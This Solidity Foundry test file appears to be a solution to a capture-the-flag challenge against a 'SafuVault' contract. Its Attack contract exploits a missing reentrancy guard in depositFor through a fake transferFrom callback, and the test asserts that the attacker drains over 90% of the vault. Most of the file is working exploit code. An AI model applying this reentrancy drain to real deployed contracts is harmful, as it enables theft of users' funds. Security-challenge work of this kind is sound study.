// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// utilities
import {Test} from "@forge-std/Test.sol";
import {console} from "@forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// core contracts
import {SafuStrategy} from "src/Safu-Vault/SafuStrategy.sol";
import {SafuVault,IStrategy} from "src/Safu-Vault/SafuVault.sol";

/// @author viking71
/// vulnerability in this challenge is in depositFor function which is not having the re-entrancy guard and not using the want()

contract Token is ERC20, Ownable {
    constructor(
        string memory _name,
        string memory _symbol
    ) ERC20(
        _name,
        _symbol
    ) {}

    function mint(address user, uint256 amount) external onlyOwner {
        _mint(user, amount);
    }
}

contract Attack {
    Token public usdcToken;
    SafuVault public safuVaultContract;
    uint256 i;
    constructor(address usdcAddress, address vaultAddress) {
        usdcToken = Token(usdcAddress);
        safuVaultContract = SafuVault(vaultAddress);
    }

    function exploit() public {
        uint256 value = usdcToken.balanceOf(address(this))/10;
        safuVaultContract.depositFor(address(this), value, address(this));
        safuVaultContract.withdrawAll();
        usdcToken.transfer(msg.sender, usdcToken.balanceOf(address(this)));
    }   

    function transferFrom(address from, address to, uint256 amount) public {
        if(i<10) {
            i++;
            usdcToken.transfer(msg.sender, amount);
            safuVaultContract.depositFor(address(this), amount, address(this));
        }
    }
}

contract SafuVaultTest is Test {

    address attacker = makeAddr('attacker');
    address admin = makeAddr('admin'); // should not be used
    address user = makeAddr('user'); // should not be used

    Token usdc;
    SafuVault safuVault;
    SafuStrategy safuStrategy;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(user, 10_000 ether);

        // setting up the scenario by admin
        vm.startPrank(admin);
        usdc = new Token("USDC", "USDC");
        usdc.mint(attacker, 10_000 ether);
        usdc.mint(user, 10_000 ether);
        safuStrategy = new SafuStrategy(address(usdc));
        safuVault = new SafuVault(IStrategy(address(safuStrategy)),'LP Token','LP');
        safuStrategy.setVault(address(safuVault));
        vm.stopPrank();

        // user deposits 10000 ether to vault
        vm.startPrank(user);
        usdc.approve(address(safuVault), type(uint).max);
        safuVault.depositAll();
        vm.stopPrank();
        assertEq(safuVault.balanceOf(user), 10000 ether);
    }

    function testChallengeExploit() public {
        vm.startPrank(attacker, attacker);
        Attack attack = new Attack(address(usdc), address(safuVault));
        usdc.transfer(address(attack), usdc.balanceOf(attacker));
        attack.exploit();
        vm.stopPrank();
        // attacker drains >= 90% of funds
        uint256 totalVaultFunds = usdc.balanceOf(address(safuVault)) + usdc.balanceOf(address(safuStrategy));
        assertLe(totalVaultFunds, 1_000e18);
        assertGe(usdc.balanceOf(attacker), 19_000e18);
    }
}